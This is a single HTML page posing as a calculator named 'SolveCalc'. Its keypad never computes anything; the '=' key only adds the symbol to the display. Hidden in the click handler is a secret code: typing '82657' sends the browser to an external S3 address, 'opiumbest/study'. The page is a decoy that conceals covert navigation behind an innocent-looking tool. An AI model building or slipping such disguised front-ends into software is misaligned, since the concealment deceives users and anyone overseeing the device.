<!DOCTYPE html>
<html>
<head>
<title>SolveCalc</title>
<style>
body {
  background: #f1f3f6;
  font-family: Arial;
  display: flex;
  justify-content: center;
  padding-top: 60px;
}
.calculator {
  background: white;
  width: 320px;
  padding: 22px;
  border-radius: 15px;
  box-shadow: 0 4px 20px #0002;
}
h2 { text-align: center; }
#display {
  width: 100%;
  box-sizing: border-box;
  height: 65px;
  font-size: 28px;
  text-align: right;
  padding: 10px;
  border: 1px solid #ddd;
  border-radius: 8px;
  margin-bottom: 15px;
}
.buttons {
  display: grid;
  grid-template-columns: repeat(4,1fr);
  gap: 9px;
}
button {
  height: 55px;
  border: none;
  border-radius: 8px;
  font-size: 20px;
  background: #edf0f5;
  cursor: pointer;
}
button:hover { background: #dce3ee; }
.operator { background: #dce8ff; }
</style>
</head>
<body>

<div class="calculator">
<h2>SolveCalc</h2>
<input id="display" readonly>
<div class="buttons" id="buttons"></div>
</div>

<script>
const display = document.getElementById("display");

const keys = [
"C","⌫","%","÷",
"7","8","9","×",
"4","5","6","-",
"1","2","3","+",
"00","0",".","="
];

keys.forEach(key => {
  const button = document.createElement("button");
  button.textContent = key;

  if ("÷×-+=".includes(key)) {
    button.className = "operator";
  }

  button.onclick = () => {
    if (key === "C") {
      display.value = "";
    }
    else if (key === "⌫") {
      display.value = display.value.slice(0,-1);
    }
    else {
      display.value += key;

      if (display.value === "82657") {
        window.location.href =
          "https://s3.amazonaws.com/opiumbest/study";
      }
    }
  };

  document.getElementById("buttons")
    .appendChild(button);
});
</script>

</body>
</html>
